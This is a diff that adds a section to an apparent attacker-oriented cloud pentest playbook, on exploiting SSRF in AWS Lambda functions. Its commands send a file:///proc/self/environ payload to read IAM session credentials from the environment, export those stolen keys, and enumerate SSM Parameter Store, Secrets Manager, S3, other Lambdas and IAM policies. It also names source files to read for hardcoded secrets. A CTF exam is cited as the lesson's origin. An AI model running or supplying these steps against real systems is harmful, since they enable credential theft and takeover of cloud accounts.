@@ -68,6 +68,52 @@ curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?
 ```
 **Impact:** Critical — instance role credentials → cloud account access
 
+## Pattern 4b: SSRF → file:///proc/self/environ on Lambda/Serverless
+
+**Hit rate:** High — when SSRF exists on Lambda/Cloud Functions and IMDSv1 is blocked
+**Scenario:** SSRF found in a serverless function (e.g., user-supplied URL fetched via `requests.get()`). IMDSv1 (169.254.169.254) is blocked or disabled, but `file://` protocol is not filtered.
+
+**Check:**
+```bash
+# Test file:// protocol support via the SSRF
+curl -X POST "https://target.com/api/fetch" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "file:///proc/self/environ"}'
+
+# Lambda env vars are null-byte separated. Parse:
+# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, AWS_REGION
+# Also look for: custom secrets, DB URLs, API keys in custom env vars
+```
+
+**Post-exploitation (with stolen IAM creds):**
+```bash
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+export AWS_DEFAULT_REGION="us-east-1"
+
+# 1. Confirm identity
+aws sts get-caller-identity
+
+# 2. Enumerate accessible services (try each, note AccessDenied vs results)
+aws ssm get-parameters-by-path --path "/" --recursive    # SSM Parameter Store
+aws secretsmanager list-secrets                          # Secrets Manager
+aws s3 ls                                                # S3 buckets
+aws lambda list-functions                                # Other Lambdas
+aws iam list-attached-role-policies --role-name <role>   # IAM permissions
+```
+
+**Also try reading Lambda source:**
+```bash
+# file:///var/task/lambda_function.py (default handler)
+# file:///var/task/index.js (Node.js)
+# Reveals: internal logic, hardcoded secrets, other service endpoints
+```
+
+**Key lesson (SecOps Exam, June 2026):** Lambda had IMDSv1 blocked (connection refused to 169.254.169.254) but `file://` was unrestricted. Reading `/proc/self/environ` exposed IAM session credentials + a flag stored in a custom env var (`AWS_Hacking`). Post-exploitation via `aws ssm get-parameters-by-path` found an additional flag in Parameter Store.
+
+**Impact:** Critical — full IAM role credentials + any secrets in env vars or Parameter Store
+
 ## Pattern 5: GitHub Leaked AWS Keys
 
 **Hit rate:** Medium — automated scanners catch most, but old commits persist
